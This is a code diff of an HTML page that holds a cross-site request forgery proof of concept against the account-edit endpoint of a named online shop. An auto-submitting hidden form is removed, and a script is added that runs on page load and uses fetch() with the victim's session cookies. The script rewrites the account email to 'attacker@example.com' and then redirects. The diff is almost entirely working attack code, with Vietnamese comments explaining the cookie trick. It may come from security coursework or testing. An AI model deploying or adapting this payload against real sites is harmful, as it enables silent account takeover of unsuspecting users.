@@ -2971,25 +2971,24 @@
       defer
       data-wp-strategy="defer"
     ></script>
-    <form
-      id="csrf"
-      action="https://mydecobox.shop/my-account/edit-account/"
-      method="POST"
-    >
-      <input type="hidden" name="account_first_name" value="Nguyễn" />
-      <input type="hidden" name="account_last_name" value="Văn A" />
-      <input type="hidden" name="account_display_name" value="lacnhuwork" />
-      <input type="hidden" name="account_email" value="lcnhu.uit@gmail.com" />
-      <input type="hidden" name="save_account_details" value="Save changes" />
-      <!-- Thêm trường này: -->
-      <input
-        type="hidden"
-        name="_wp_http_referer"
-        value="/my-account/edit-account/"
-      />
-    </form>
     <script>
-      document.getElementById("csrf").submit();
+      fetch("https://mydecobox.shop/my-account/edit-account/", {
+        method: "POST",
+        credentials: "include", // bắt browser gửi cả cookie session
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          account_first_name: "Nguyễn",
+          account_last_name: "Văn A",
+          account_display_name: "lacnhuwork",
+          account_email: "attacker@example.com",
+          save_account_details: "Save changes",
+          _wp_http_referer: "/my-account/edit-account/",
+        }),
+      }).then(
+        (r) =>
+          (window.location =
+            "https://mydecobox.shop/my-account/edit-account/?done")
+      );
     </script>
   </body>
 </html>
